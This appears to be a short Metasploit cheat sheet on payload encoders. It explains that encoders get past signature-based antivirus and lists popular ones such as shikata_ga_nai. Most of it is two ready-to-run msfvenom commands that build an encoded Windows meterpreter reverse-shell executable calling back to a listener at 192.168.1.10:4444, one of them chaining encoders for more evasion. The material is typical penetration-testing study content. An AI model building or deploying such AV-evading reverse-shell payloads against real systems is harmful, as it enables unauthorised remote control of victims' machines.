# Exploits

Encoders obfuscate payloads to avoid detection by antivirus.

**Purpose**: Obfuscate payloads to avoid detection by antivirus/IDS

> * Encoders do NOT encrypt
> * Only change payload appearance

📁 Location

`/encoders/`

## Why Use Encoders?

* Bypass signature-based AV

* Avoid bad characters

## Common Encoders


`# List all encoders`

```
show encoders
```
`# Popular encoders`
```
x86/shikata_ga_nai  `# Most popular, polymorphic XOR`
x86/fnstenv_mov
x86/call4_dword_xor
cmd/powershell_base64
```

`# Use with msfvenom`
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > payload.exe
```
`# Options for shikata_ga_nai`
`# -i : iteration count (more iterations = better obfuscation but larger file)`

## Encoding Example

`# Multiple encoders`

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f raw | msfvenom -e x86/alpha_upper -i 2 -f exe > payload.exe
```

